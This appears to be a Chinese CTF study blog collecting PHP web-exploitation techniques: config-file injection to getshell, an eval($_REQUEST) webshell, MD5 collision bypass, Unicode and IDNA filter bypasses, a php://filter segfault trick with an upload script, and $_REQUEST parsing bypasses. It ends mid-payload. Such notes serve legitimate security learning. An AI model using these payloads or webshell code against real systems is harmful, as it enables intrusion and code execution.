<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>


<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>


<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span>/</span><br></pre></td></tr></table></figure>


<p><code>config.php</code>变为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>


<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
<p>所以我们可以用:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>


<p>执行第一条后<code>config.php</code>的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>再执行第二条后<code>config.php</code>的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
<hr>
<p>要<code>getshell</code>直接</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>

<h1 id="MD5强类型比较"><a href="#MD5强类型比较" class="headerlink" title="MD5强类型比较"></a>MD5强类型比较</h1><p><a href="https://www.hetianlab.com/specialized/20210207105730">https://www.hetianlab.com/specialized/20210207105730</a></p>
<h2 id="比较"><a href="#比较" class="headerlink" title="&#x3D;&#x3D;&#x3D;比较"></a>&#x3D;&#x3D;&#x3D;比较</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h2><p>也可以传入两个数组，但不再适合传入两个0e开头的字符串，因为&#x3D;&#x3D;&#x3D;是md5的强碰撞，进行了严格的过滤。</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20240113212111331.png"><img src="/Notes/image-20240113212111331.png" alt="image-20240113212111331"></a></p>
<h2 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h2><p>使用md5加密后两个完全相等的两个字符串来绕过过滤。</p>
<p>如何生成两个不一样的字符串，但是MD5是一样的呢。参考<a href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a>后，我们可以使用快速MD5碰撞生成器来构建两个MD5一样，但内容完全不一样的字符串。</p>
<p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe.zip</a></p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>创建一个文本文件，写入任意的文件内容，命名为ywj.txt （源文件）</p>
<p>运行fastcoll输出以下参数。-p 是源文件，-o是输出文件</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fastcoll_v1</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>.exe -p ywj.txt -o <span class="number">1</span>.txt <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20240113212048880.png"><img src="/Notes/image-20240113212048880.png" alt="image-20240113212048880"></a></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>对生产的1.txt和2.txt文件进行测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>. <span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>. <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>.<span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>.  <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">二进制md5加密 <span class="number">8e4</span>ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%A3njn%FD%<span class="number">1</span>A%CB%<span class="number">3</span>A%<span class="number">29</span>Wr%<span class="number">02</span>En%CE%<span class="number">89</span>%<span class="number">9</span>A%E3%<span class="number">8</span>EF%F1%BE%E9%EE3%<span class="number">0</span>E%<span class="number">82</span>%<span class="number">2</span>A%<span class="number">95</span>%<span class="number">23</span>%<span class="number">0</span>D%FA%CE%<span class="number">1</span>C%F2%C4P%C2%B7s%<span class="number">0</span>F%C8t%F28%FAU%AD%<span class="number">2</span>C%EB%<span class="number">1</span>D%D8%D2%<span class="number">00</span>%<span class="number">8</span>C%<span class="number">3</span>B%FCN%C9b4%DB%AC%<span class="number">17</span>%A8%BF%<span class="number">3</span>Fh%<span class="number">84</span>i%F4%<span class="number">1</span>E%B5Q%<span class="number">7</span>B%FC%B9RuJ%<span class="number">60</span>%B4%<span class="number">0</span>D7%F9%F9%<span class="number">00</span>%<span class="number">1</span>E%C1%<span class="number">1</span>B%<span class="number">16</span>%C9M%<span class="number">2</span>A%<span class="number">7</span>D%B2%BBoW%<span class="number">02</span>%<span class="number">7</span>D%<span class="number">8</span>F%<span class="number">7</span>F%C0qT%D0%CF%<span class="number">3</span>A%<span class="number">9</span>DFH%F1%<span class="number">25</span>%AC%DF%FA%C4G%<span class="number">27</span>uW%CFNB%E7%EF%B0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二进制md5加密 <span class="number">8e4</span>ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%A3njn%FD%<span class="number">1</span>A%CB%<span class="number">3</span>A%<span class="number">29</span>Wr%<span class="number">02</span>En%CE%<span class="number">89</span>%<span class="number">9</span>A%E3%<span class="number">8</span>E%C6%F1%BE%E9%EE3%<span class="number">0</span>E%<span class="number">82</span>%<span class="number">2</span>A%<span class="number">95</span>%<span class="number">23</span>%<span class="number">0</span>D%FA%CE%<span class="number">1</span>C%F2%C4P%C2%B7s%<span class="number">0</span>F%C8t%F28zV%AD%<span class="number">2</span>C%EB%<span class="number">1</span>D%D8%D2%<span class="number">00</span>%<span class="number">8</span>C%<span class="number">3</span>B%FCN%C9%E24%DB%AC%<span class="number">17</span>%A8%BF%<span class="number">3</span>Fh%<span class="number">84</span>i%F4%<span class="number">1</span>E%B5Q%<span class="number">7</span>B%FC%B9RuJ%<span class="number">60</span>%B4%<span class="number">0</span>D%B7%F9%F9%<span class="number">00</span>%<span class="number">1</span>E%C1%<span class="number">1</span>B%<span class="number">16</span>%C9M%<span class="number">2</span>A%<span class="number">7</span>D%B2%BBoW%<span class="number">02</span>%<span class="number">7</span>D%<span class="number">8</span>F%<span class="number">7</span>F%C0qT%D0%CF%<span class="number">3</span>A%<span class="number">1</span>DFH%F1%<span class="number">25</span>%AC%DF%FA%C4G%<span class="number">27</span>uW%CF%CEB%E7%EF%B0</span><br></pre></td></tr></table></figure>

<p>可以看到，1.txt和2.txt文件二进制md5加密后的结果完全相同。由于1.txt和2.txt文件中含有不可见字符，所以需要将其url编码后使用。可以看到url编码后的两个字符串不完全相同，满足我们输入两个不同参数的需要。</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20240113212022967.png"><img src="/Notes/image-20240113212022967.png" alt="image-20240113212022967"></a></p>
<p>当题目限制不能传入数组，只能传入字符串时，如下例题，就只能采用解法2.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Unionde等价性的漏洞"><a href="#Unionde等价性的漏洞" class="headerlink" title="Unionde等价性的漏洞"></a>Unionde等价性的漏洞</h1><p>这里由于只能输入一个字符，所以这里利用了utf-8编码。</p>
<p>两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。</p>
<p>这里在compart网站上找一个大于1337的值</p>
<p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p>
<p>在搜索框中搜索thousand</p>
<p><a data-fancybox="gallery" data-src="/Notes/%7B9B902913-B5EA-4AF3-ADD1-A61F97A0281C%7D.png"><img src="/Notes/%7B9B902913-B5EA-4AF3-ADD1-A61F97A0281C%7D.png" alt="{9B902913-B5EA-4AF3-ADD1-A61F97A0281C}"></a></p>
<p>这里我选择了罗马数字十万</p>
<p>数值是100000</p>
<p>utf-8的值是<code>0xE2 0x86 0x88</code></p>
<p>换成%    &#x3D;&gt;  %E2%86%88</p>
<h1 id="idna与utf-8编码漏洞"><a href="#idna与utf-8编码漏洞" class="headerlink" title="idna与utf-8编码漏洞"></a>idna与utf-8编码漏洞</h1><p>来自Black hat 2019<br><strong>原理</strong><br><strong>什么是IDN?</strong><br>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p>
<p><strong>什么是idna?</strong><br>A library to support the Internationalised Domain Names in Applications (IDNA) protocol as specified in RFC 5891. This version of the protocol is often referred to as “IDNA2008” and can produce different results from the earlier standard from 2003.<br>&gt;&gt;&gt; import idna<br>&gt;&gt;&gt; print(idna.encode(u’ドメイン.テスト’))<br>结果:xn–eckwd4c7c.xn–zckzah<br>&gt;&gt;&gt; print idna.decode(‘xn–eckwd4c7c.xn–zckzah’)<br>结果:ドメイン.テスト</p>
<p><strong>Demo</strong>:<br><code>℆</code>这个字符,如果使用python3进行idna编码的话<br><code>print(&#39;℆&#39;.encode(&#39;idna&#39;))</code><br>结果<br><code>b&#39;c/u&#39;</code><br>如果再使用utf-8进行解码的话<br><code>print(b&#39;c/u&#39;.decode(&#39;utf-8&#39;))</code><br>结果<br><code>c/u</code></p>
<p>可以用于绕过一些过滤，如</p>
<p>过滤了suctf.cc，但是中间进行了多次decode(‘utf-8’)，就可以如下进行绕过用<code>℆</code>转化成<code>c/u</code></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">suctf.<span class="keyword">c</span>℆ -&gt; suctf.<span class="keyword">cc</span>/u</span><br></pre></td></tr></table></figure>

<p>可以用脚本跑出其他字符，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_unicode</span>():</span><br><span class="line">    length = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter the number of characters to read from the host: &#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni = <span class="built_in">chr</span>(x)</span><br><span class="line">        url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST[:-length], uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span> + uni + <span class="string">&#x27; unicode: \\u&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == HOST.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>]:  <span class="comment"># 取出实际主机名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == HOST.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == HOST.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST = <span class="built_in">input</span>(<span class="string">&#x27;Enter URL: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> HOST:</span><br><span class="line">        HOST = <span class="string">&#x27;http://&#x27;</span> + HOST</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20250124105534724.png"><img src="/Notes/image-20250124105534724.png" alt="image-20250124105534724"></a></p>
<h1 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h1><h3 id="php7-0的bug"><a href="#php7-0的bug" class="headerlink" title="php7.0的bug"></a>php7.0的bug</h3><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</p>
<blockquote>
<p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p>
<p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
</blockquote>
<h4 id="利用segment-fault特性"><a href="#利用segment-fault特性" class="headerlink" title="利用segment fault特性"></a>利用segment fault特性</h4><p>php版本是7.0.33，这里预期解是1号情况。</p>
<ul>
<li><p>php&lt;7.2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p>php7老版本通杀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span class="string">&quot;http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="PHP读取请求解析漏洞"><a href="#PHP读取请求解析漏洞" class="headerlink" title="PHP读取请求解析漏洞"></a>PHP读取请求解析漏洞</h1><blockquote>
<p><code>$_REQUEST</code>的传参中<code>POST</code>的优先级比<code>GET</code>高，所以如下可以对post传入数字，这样就绕过了对get中字母的检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>会读取<code>?</code>后面的内容，</p>
<p>在读取url时并不会对<code>url</code>进行解码，</p>
<p>而<code>$_GET[&#39;x&#39;]</code>是会进行url解码的，</p>
<p>所以我们要把可能出现在黑名单的字符串进行url编码后再传入，所以需要将后续GET包括参数名都进行编码</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">?<span class="meta">%</span><span class="number">66</span><span class="meta">%</span><span class="number">69</span><span class="meta">%</span><span class="number">6</span>C<span class="meta">%</span><span class="number">65</span>=<span class="meta">%</span><span class="number">64</span><span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">74</span><span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span><span class="number">74</span><span class="meta">%</span><span class="number">65</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">74</span><span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span><span class="number">70</span><span class="meta">%</span><span class="number">6</span>C<span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">69</span><span class="meta">%</span><span 